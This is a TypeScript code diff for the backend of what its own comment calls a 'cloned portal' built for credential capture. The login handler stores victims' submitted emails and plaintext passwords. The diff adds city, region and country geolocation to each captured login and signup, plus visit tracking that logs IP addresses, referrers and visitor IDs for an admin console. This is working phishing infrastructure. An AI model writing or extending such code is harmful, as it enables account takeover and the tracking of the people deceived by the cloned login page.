@@ -3,9 +3,9 @@ import { mkdir, readFile, rename, writeFile } from "node:fs/promises";
 import path from "node:path";
 
 import { getSupabaseAdmin } from "@/lib/supabase";
-import type { LoginEvent, PortalEvent, SignupEvent } from "@/types/portal";
+import type { LoginEvent, PortalEvent, PortalVisit, SignupEvent, VisitPage } from "@/types/portal";
 
-export type { LoginEvent, PortalEvent, SignupEvent } from "@/types/portal";
+export type { LoginEvent, PortalEvent, PortalVisit, SignupEvent } from "@/types/portal";
 
 /**
  * Demo credential capture for the cloned portal.
@@ -22,7 +22,9 @@ export type { LoginEvent, PortalEvent, SignupEvent } from "@/types/portal";
 
 const DATA_DIR = path.join(process.cwd(), ".data");
 const DATA_FILE = path.join(DATA_DIR, "portal-events.json");
+const VISITS_FILE = path.join(DATA_DIR, "portal-visits.json");
 const TABLE = "portal_events";
+const VISITS_TABLE = "portal_visits";
 
 /** Serialises local read-modify-write cycles so concurrent requests cannot drop rows. */
 let queue: Promise<unknown> = Promise.resolve();
@@ -53,9 +55,18 @@ type EventRow = {
   agreements: number | null;
   ip: string | null;
   user_agent: string | null;
+  geo_country: string | null;
+  geo_city: string | null;
+  geo_region: string | null;
 };
 
 function rowToEvent(row: EventRow): PortalEvent {
+  const geo = {
+    geoCountry: row.geo_country ?? "",
+    geoCity: row.geo_city ?? "",
+    geoRegion: row.geo_region ?? "",
+  };
+
   if (row.kind === "login") {
     return {
       id: row.id,
@@ -66,6 +77,7 @@ function rowToEvent(row: EventRow): PortalEvent {
       remember: row.remember === true,
       ip: row.ip ?? "",
       userAgent: row.user_agent ?? "",
+      ...geo,
     };
   }
 
@@ -85,6 +97,7 @@ function rowToEvent(row: EventRow): PortalEvent {
     agreements: row.agreements ?? 0,
     ip: row.ip ?? "",
     userAgent: row.user_agent ?? "",
+    ...geo,
   };
 }
 
@@ -106,6 +119,9 @@ function eventToRow(event: PortalEvent): Omit<EventRow, "created_at"> & { create
     agreements: null as number | null,
     ip: event.ip,
     user_agent: event.userAgent,
+    geo_country: event.geoCountry ?? null,
+    geo_city: event.geoCity ?? null,
+    geo_region: event.geoRegion ?? null,
   };
 
   if (event.kind === "login") {
@@ -158,26 +174,14 @@ async function insertEvent(event: PortalEvent): Promise<void> {
 }
 
 function meta(request: Request) {
-  const headers = request.headers;
-  // Cloudflare and most proxies put the real client address in dedicated
-  // headers; `x-forwarded-for` is the fallback for generic deployments.
-  const candidates = [
-    headers.get("cf-connecting-ip"),
-    headers.get("x-real-ip"),
-    headers.get("x-forwarded-for")?.split(",")[0],
-  ];
-  const ip = candidates.map((value) => value?.trim()).find(Boolean) || "127.0.0.1";
-
-  return {
-    ip,
-    userAgent: headers.get("user-agent") ?? "",
-  };
+  return visitMeta(request);
 }
 
 export async function recordLogin(
   request: Request,
   input: { email: string; password: string; remember: boolean },
 ): Promise<LoginEvent> {
+  const metaInfo = meta(request);
   const event: LoginEvent = {
     id: randomUUID(),
     kind: "login",
@@ -185,7 +189,11 @@ export async function recordLogin(
     email: input.email,
     password: input.password,
     remember: input.remember,
-    ...meta(request),
+    ip: metaInfo.ip,
+    userAgent: metaInfo.userAgent,
+    geoCountry: metaInfo.country,
+    geoCity: metaInfo.city,
+    geoRegion: metaInfo.region,
   };
   await insertEvent(event);
   return event;
@@ -193,14 +201,22 @@ export async function recordLogin(
 
 export async function recordSignup(
   request: Request,
-  input: Omit<SignupEvent, "id" | "kind" | "at" | "ip" | "userAgent">,
+  input: Omit<
+    SignupEvent,
+    "id" | "kind" | "at" | "ip" | "userAgent" | "geoCountry" | "geoCity" | "geoRegion"
+  >,
 ): Promise<SignupEvent> {
+  const metaInfo = meta(request);
   const event: SignupEvent = {
     id: randomUUID(),
     kind: "signup",
     at: new Date().toISOString(),
     ...input,
-    ...meta(request),
+    ip: metaInfo.ip,
+    userAgent: metaInfo.userAgent,
+    geoCountry: metaInfo.country,
+    geoCity: metaInfo.city,
+    geoRegion: metaInfo.region,
   };
   await insertEvent(event);
   return event;
@@ -240,4 +256,164 @@ export async function clearEvents(): Promise<number> {
     await writeAllLocal([]);
     return events.length;
   });
+}
+
+/* -------------------------------------------------------------------------- */
+/* Visits                                                                     */
+/* -------------------------------------------------------------------------- */
+
+type VisitRow = {
+  id: string;
+  created_at: string;
+  path: string;
+  page: VisitPage;
+  referrer: string | null;
+  country: string | null;
+  city: string | null;
+  region: string | null;
+  timezone: string | null;
+  ip: string | null;
+  user_agent: string | null;
+  visitor_id: string | null;
+};
+
+/** Maps a URL path to the coarse buckets the admin console reports on. */
+export function classifyPage(pathname: string): VisitPage {
+  const path = pathname.toLowerCase();
+  if (path === "/" || path === "") return "home";
+  if (path.startsWith("/login")) return "login";
+  if (path.startsWith("/live_signup") || path.startsWith("/register") || path.startsWith("/signup")) {
+    return "signup";
+  }
+  return "other";
+}
+
+function rowToVisit(row: VisitRow): PortalVisit {
+  return {
+    id: row.id,
+    at: row.created_at,
+    path: row.path,
+    page: row.page,
+    referrer: row.referrer ?? "",
+    country: row.country ?? "",
+    city: row.city ?? "",
+    region: row.region ?? "",
+    timezone: row.timezone ?? "",
+    ip: row.ip ?? "",
+    userAgent: row.user_agent ?? "",
+    visitorId: row.visitor_id ?? "",
+  };
+}
+
+function visitToRow(visit: PortalVisit): Omit<VisitRow, "created_at"> & { created_at: string } {
+  return {
+    id: visit.id,
+    created_at: visit.at,
+    path: visit.path,
+    page: visit.page,
+    referrer: visit.referrer || null,
+    country: visit.country || null,
+    city: visit.city || null,
+    region: visit.region || null,
+    timezone: visit.timezone || null,
+    ip: visit.ip || null,
+    user_agent: visit.userAgent || null,
+    visitor_id: visit.visitorId || null,
+  };
+}
+
+async function readVisitsLocal(): Promise<PortalVisit[]> {
+  try {
+    const raw = await readFile(VISITS_FILE, "utf8");
+    const parsed: unknown = JSON.parse(raw);
+    return Array.isArray(parsed) ? (parsed as PortalVisit[]) : [];
+  } catch {
+    return [];
+  }
+}
+
+async function writeVisitsLocal(visits: PortalVisit[]): Promise<void> {
+  await mkdir(DATA_DIR, { recursive: true });
+  const tempFile = `${VISITS_FILE}.${process.pid}.tmp`;
+  await writeFile(tempFile, `${JSON.stringify(visits, null, 2)}\n`, "utf8");
+  await rename(tempFile, VISITS_FILE);
+}
+
+type CloudflareRequestMeta = {
+  country?: string;
+  city?: string;
+  region?: string;
+  timezone?: string;
+};
+
+/** Geo/meta from Cloudflare's `request.cf`, with header fallbacks. */
+function visitMeta(request: Request) {
+  const headers = request.headers;
+  const cf = (request as Request & { cf?: CloudflareRequestMeta }).cf ?? {};
+
+  const ip =
+    [
+      headers.get("cf-connecting-ip"),
+      headers.get("x-real-ip"),
+      headers.get("x-forwarded-for")?.split(",")[0],
+    ]
+      .map((value) => value?.trim())
+      .find(Boolean) || "127.0.0.1";
+
+  const country = (cf.country ?? headers.get("cf-ipcountry") ?? "").trim().toUpperCase();
+  const flagged = country === "XX" || country === "T1";
+
+  return {
+    ip,
+    country: flagged ? "" : country,
+    city: (cf.city ?? "").trim(),
+    region: (cf.region ?? "").trim(),
+    timezone: (cf.timezone ?? "").trim(),
+    userAgent: headers.get("user-agent") ?? "",
+  };
+}
+
+export async function recordVisit(
+  request: Request,
+  input: { path: string; page: VisitPage; referrer: string; visitorId: string },
+): Promise<PortalVisit> {
+  const visit: PortalVisit = {
+    id: randomUUID(),
+    at: new Date().toISOString(),
+    path: input.path.slice(0, 512),
+    page: input.page,
+    referrer: input.referrer.slice(0, 512),
+    visitorId: input.visitorId.slice(0, 64),
+    ...visitMeta(request),
+  };
+
+  const supabase = getSupabaseAdmin();
+  if (supabase) {
+    const { error } = await supabase.from(VISITS_TABLE).insert(visitToRow(visit));
+    if (error) throw new Error(`Supabase visit insert failed: ${error.message}`);
+    return visit;
+  }
+
+  await withLock(async () => {
+    const visits = await readVisitsLocal();
+    visits.push(visit);
+    await writeVisitsLocal(visits);
+  });
+  return visit;
+}
+
+export async function listVisits(): Promise<PortalVisit[]> {
+  const supabase = getSupabaseAdmin();
+  if (supabase) {
+    const { data, error } = await supabase
+      .from(VISITS_TABLE)
+      .select("*")
+      .order("created_at", { ascending: false })
+      .limit(5000);
+    if (error) throw new Error(`Supabase visit select failed: ${error.message}`);
+    return ((data ?? []) as VisitRow[]).map(rowToVisit);
+  }
+
+  const visits = await readVisitsLocal();
+  return visits.sort((a, b) => b.at.localeCompare(a.at)).slice(0, 5000);
 }
